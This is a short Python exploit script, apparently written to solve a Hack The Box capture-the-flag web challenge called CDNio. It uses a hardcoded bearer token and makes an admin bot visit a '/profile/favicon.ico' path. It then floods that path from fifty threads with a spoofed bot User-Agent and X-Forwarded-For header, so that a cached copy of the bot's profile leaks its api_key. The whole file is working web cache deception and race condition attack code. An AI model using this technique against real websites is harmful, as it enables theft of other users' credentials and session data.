#!/usr/bin/python3.11

# Preform a register and then grab the token from the search page. Paste it here.
# I was too lazy to code that part...       .;,,;.

import requests
import threading
import time

BASE_URL = "http://cdnio.htb:44580"
USER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJteWFkbWluIiwiaWF0IjoxNzQyMTQxMjIzLCJleHAiOjE3NDIyMjc2MjN9.qHQVkFbSleCUbkWz69nBcr6seT_hxM9kD1w7jwbCbOU"

HEADERS_JSON = {
    "Authorization": f"Bearer {USER_TOKEN}",
    "Content-Type": "application/json"
}

# Mimic the bot's headers to trick the cache
HEADERS_GET = {
    "Authorization": f"Bearer {USER_TOKEN}",
    "User-Agent": "CDNio Bot ()",  # Spoof bot's User-Agent
    "X-Forwarded-For": "127.0.0.1",  # Trick caching
    "Cache-Control": "max-age=0, no-store, no-cache, must-revalidate",
    "Pragma": "no-cache"
}

# Function to trigger /visit
def trigger_bot():
    payload = {"uri": "profile/favicon.ico"}
    response = requests.post(f"{BASE_URL}/visit", json=payload, headers=HEADERS_JSON)
    print(f"[+] Triggered bot: {response.status_code} - {response.text}")

# Function to spam requests to /profile with caching tricks
def spam_profile():
    while True:
        response = requests.get(f"{BASE_URL}/profile/favicon.ico", headers=HEADERS_GET)
        if response.status_code == 200:
            print(f"Success: {response.text}")
            if "api_key" in response.text:
                print("Potential Flag Found!")
                exit()
        elif response.status_code == 401:
            print("[!] Unauthorized - Token issue.")
        time.sleep(0.1)  # Slight delay to reduce server load

# Run the attack
if __name__ == "__main__":
    print("[*] Starting race condition exploit...")

    # Start the bot trigger in a separate thread
    bot_thread = threading.Thread(target=trigger_bot)
    bot_thread.start()

    # Small delay before spamming (to align with the bot's request timing)
    time.sleep(1)

    # Start multiple threads to spam /profile
    spam_threads = []
    for _ in range(50):  # Adjust the number of threads if needed
        t = threading.Thread(target=spam_profile)
        t.start()
        spam_threads.append(t)

    # Join threads
    for t in spam_threads:
        t.join()

